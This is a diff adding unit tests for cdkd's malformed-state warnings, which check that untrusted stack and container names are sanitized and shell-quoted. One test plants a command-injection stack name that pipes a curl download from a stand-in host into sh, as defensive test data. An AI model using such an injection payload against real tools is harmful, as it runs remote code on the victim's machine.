@@ -5,11 +5,15 @@ import { dirname, join } from 'node:path';
 import {
   STATE_RESOURCES_MALFORMED,
   hasReadableResources,
+  isReadableBag,
+  malformedRenderedContainersWarning,
   malformedResourcesWarning,
   malformedStateRefusalMessage,
   refuseMalformedState,
   repairMalformedResourcesForReadOnly,
+  type RenderedStateContainer,
 } from '../../../src/state/malformed-resources-bag.js';
+import { UNRENDERABLE } from '../../../src/utils/display-safe.js';
 import { CdkdError } from '../../../src/utils/error-handler.js';
 import type { StackState } from '../../../src/types/state.js';
 
@@ -327,6 +331,151 @@ describe('the user-facing text', () => {
       'the finding is raised BELOW `options.fail`, so ScrubNeededError (exit 1, silent) fires ' +
         'first and reports "scrub found a leak" for a record scrub could not read.'
     ).toBeLessThan(branch.indexOf('if (options.fail)'));
+  });
+});
+
+describe('isReadableBag is the ONE predicate (issue go-to-k/cdkd#3187)', () => {
+  /**
+   * Every shape, with the verdict written as a LITERAL rather than taken from
+   * the sibling predicate.
+   *
+   * `hasReadableResources` delegates, so comparing the two is true by
+   * construction and reds on nothing inside `isReadableBag` (measured: mutating
+   * it to `return true` reds 14 cases in this file, none of them the comparison
+   * — review of go-to-k/cdkd#3190). The literals are the coverage; the
+   * comparison below is drift-detection for the day someone RE-INLINES the body
+   * into `hasReadableResources`, which is the only way the two can disagree.
+   */
+  const READABLE: ReadonlyArray<readonly [string, unknown, boolean]> = [
+    // DERIVED from the shared table, not re-spelled beside it: a shape added
+    // there must be covered here too, and a hand-written copy silently would
+    // not be (review of go-to-k/cdkd#3190). The verdicts stay literals — that
+    // is the half that must not be computed.
+    ...UNREADABLE.map(([label, value]) => [label, value, false] as const),
+    ['a boolean', true, false],
+    ['an empty object', {}, true],
+    ['a populated object', { A: 1 }, true],
+  ];
+
+  it('answers the plain-object question for every shape', () => {
+    for (const [label, value, expected] of READABLE) {
+      expect(isReadableBag(value), label).toBe(expected);
+    }
+  });
+
+  it('and hasReadableResources still delegates to it, so the two cannot drift', () => {
+    for (const [label, value] of READABLE) {
+      expect(hasReadableResources(state(value)), label).toBe(isReadableBag(value));
+    }
+  });
+});
+
+describe('the rendered-container warning (issue go-to-k/cdkd#3187)', () => {
+  const CONTAINERS: readonly RenderedStateContainer[] = [
+    'outputs',
+    'skippedOutputs',
+    'attributes',
+    'properties',
+  ];
+
+  it('renders both identifiers exactly as its sibling messages do, and ends on the command', () => {
+    // A planted stack name that would close the quoting and append its own
+    // command to the line this text tells the user to RUN. A stack name reaches
+    // these paths from an S3 key, so it is not trusted.
+    const evil = "a'; curl http://x|sh; echo '";
+    const w = malformedRenderedContainersWarning(evil, 'us-east-1', ['outputs']);
+    const sibling = malformedResourcesWarning(evil, 'us-east-1');
+
+    // The command is LAST and UNWRAPPED here — an outer `'...'` would compose
+    // with `shellQuote`'s own quoting into something unpastable.
+    //
+    // `command.endsWith('--json')` is the whole LAST assertion. An
+    // `expect(w.endsWith(command))` beside it would be a tautology, since
+    // `command` is a suffix of `w` by construction, and it read as a second
+    // check (review of go-to-k/cdkd#3190). This one reds on any prose appended
+    // after the command.
+    const start = w.indexOf('cdkd state show ');
+    expect(start).toBeGreaterThan(-1);
+    const command = w.slice(start);
+    expect(command.endsWith('--json')).toBe(true);
+
+    // ...and BYTE-IDENTICAL to the command the sibling message builds from the
+    // same inputs. That is the assertion that cannot rot: it pins the shared
+    // sanitize-then-shell-quote path rather than re-spelling `shellQuote`'s
+    // output here, where a hand-written expectation would have to be revised —
+    // and could be revised WRONG — every time that helper changes.
+    expect(sibling).toContain(command);
+    // The planted text never appears unquoted.
+    expect(command).not.toContain(`show ${evil} `);
+  });
+
+  it('keeps a control-bearing identifier on ONE line, so it cannot forge a row', () => {
+    const w = malformedRenderedContainersWarning(
+      `Evil${String.fromCharCode(0x1b)}[31m\nStack: Decoy`,
+      'us-east-1',
+      ['outputs']
+    );
+    expect(w.split('\n')).toHaveLength(1);
+    expect(w).not.toContain(String.fromCharCode(0x1b));
+  });
+
+  it('renders an identifier that sanitizes to EMPTY as a placeholder', () => {
+    // Never as nothing: an empty argument makes `--stack-region` swallow the
+    // next flag, turning the remedy into a differently-broken command.
+    //
+    // Built from escapes rather than written as literal bytes: a raw control
+    // character makes `grep` and `rg` treat the whole file as BINARY and skip
+    // it, so every grep-based audit stops seeing this suite. Enforced by
+    // `tests/unit/scripts/source-control-bytes.test.ts`, which is what caught
+    // the first cut of this case.
+    const controlOnly = String.fromCharCode(0x00, 0x01);
+    const w = malformedRenderedContainersWarning(controlOnly, 'us-east-1', ['outputs']);
+    expect(w).toContain(UNRENDERABLE);
+  });
+
+  it('names the containers in the order it was given, quoted', () => {
+    const w = malformedRenderedContainersWarning('S', 'us-east-1', CONTAINERS);
+    expect(w).toContain(`'outputs', 'skippedOutputs', 'attributes', 'properties'`);
+  });
+
+  it('sanitizes a container NAME too, so the closed union is not the only guard', () => {
+    // The union is closed at COMPILE time and the sole caller sources its names
+    // from a module constant, so nothing can reach this today. That is exactly
+    // why it is worth a case: the guarantee would otherwise live in a comment,
+    // and the day a caller derives a name from a record the forged element
+    // would render verbatim and could forge a line. Cast, because the type is
+    // what this case is deliberately reaching around.
+    const forged = `x\nStack: Decoy` as RenderedStateContainer;
+    const w = malformedRenderedContainersWarning('S', 'us-east-1', [forged]);
+    expect(w.split('\n')).toHaveLength(1);
+    // The RENDERED token, not just the line count: a sanitizer that returned
+    // `''` for everything would satisfy a line-count assertion while naming no
+    // container at all (review of go-to-k/cdkd#3190). The newline becomes a
+    // space, so the text survives as prose inside its quotes and cannot start a
+    // row.
+    expect(w).toContain(`'x Stack: Decoy'`);
+  });
+
+  it('floors a name that sanitizes to EMPTY and caps a multi-kilobyte one', () => {
+    // The two classes `safeIdentifier` closes that a bare sanitizer does not,
+    // and the reason the names take that helper rather than `displaySafe`
+    // alone: `''` names no container, and an uncapped name pushes the remedy
+    // command off the reader's screen. Same casts, same unreachable-today path.
+    const empty = malformedRenderedContainersWarning('S', 'us-east-1', [
+      String.fromCharCode(0x00, 0x01) as RenderedStateContainer,
+    ]);
+    expect(empty).toContain(`'${UNRENDERABLE}'`);
+
+    const long = malformedRenderedContainersWarning('S', 'us-east-1', [
+      'q'.repeat(5000) as RenderedStateContainer,
+    ]);
+    expect(long).toContain(`'${'q'.repeat(128)}...'`);
+    // The remedy is still on SCREEN after the cap — a DISTANCE, not
+    // `endsWith('--json')`, which the template satisfies on every path with or
+    // without a cap and would be the tautology this suite just deleted one case
+    // over (review of go-to-k/cdkd#3190). Uncapped, the 5000-character name
+    // alone pushes the message past this bound.
+    expect(long.length).toBeLessThan(1000);
   });
 });
 
